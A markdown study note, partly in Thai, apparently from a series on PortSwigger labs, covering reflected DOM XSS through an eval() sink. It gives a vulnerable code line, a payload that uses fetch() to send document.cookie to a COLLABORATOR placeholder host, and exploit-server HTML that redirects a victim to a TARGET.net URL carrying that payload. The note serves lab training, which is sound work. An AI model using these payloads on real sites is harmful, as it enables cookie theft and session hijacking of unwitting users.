# Pattern 6: Reflected DOM XSS (eval sink)
> [Back to Index](../README.md) | [Previous: innerHTML Ads](pattern-5-innerhtml-ads.md)

---

## Overview

**Source:** URL search parameter
**Sink:** `eval()` function
**Special:** Response in JSON, processed by JavaScript

---

## วิธี Identify

1. ใช้ DOM Invader หา eval() sink
2. ดู searchResults.js หรือ similar files
3. JSON response ถูกใช้กับ eval()

```javascript
// ตัวอย่าง vulnerable code
var searchResults = eval('(' + responseText + ')');
```

---

## Payload

```javascript
\"-fetch('https://COLLABORATOR?c='+document.cookie)}//
```

| ส่วน | ความหมาย |
|------|----------|
| `\"` | Escape double quote |
| `-` | Continue expression |
| `fetch(...)` | ส่ง cookie |
| `}` | ปิด object |
| `//` | Comment out ส่วนที่เหลือ |

**ทำไม `\` ไม่ถูก sanitize?**
- Backslash ไม่ถูก escape ถูกต้อง
- ทำให้ double-backslash cancel กัน

---

## Attack Flow

```
1. Attacker ทดสอบ \"-alert(1)}//
         ↓
2. ถ้า alert → vulnerable!
         ↓
3. สร้าง cookie stealer payload
         ↓
4. URL encode ทุก character
         ↓
5. Host บน Exploit Server หรือ local server
         ↓
6. Victim คลิก → eval() execute → Cookie ถูกขโมย
```

---

## Exploit Server Delivery

```html
<script>
location = 'https://TARGET.net/search?search=' + encodeURIComponent('\\"-fetch(\'https://COLLABORATOR?c=\'+document.cookie)}//');
</script>
```

หรือ host HTML file:
```html
<!-- index.html -->
<script>
location = "https://TARGET.net/search?search=ENCODED_PAYLOAD";
</script>
```

---

## POC Testing

1. สร้าง test cookie ใน browser console:
```javascript
document.cookie = "TestCookie=POCValue123";
```

2. ทดสอบ payload
3. เช็คว่า Collaborator รับ cookie ไหม

---

## Checklist

```
✓ ใช้ DOM Invader หา eval() sink
✓ หา JSON response ที่ถูก eval
✓ ทดสอบ \"-alert(1)}//
✓ URL encode payload ทั้งหมด
✓ Cookie ต้องไม่มี HttpOnly
```

---

## Lab Reference
- [PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

---

> **Next:** [pattern-7-cookie-manipulation.md](pattern-7-cookie-manipulation.md)
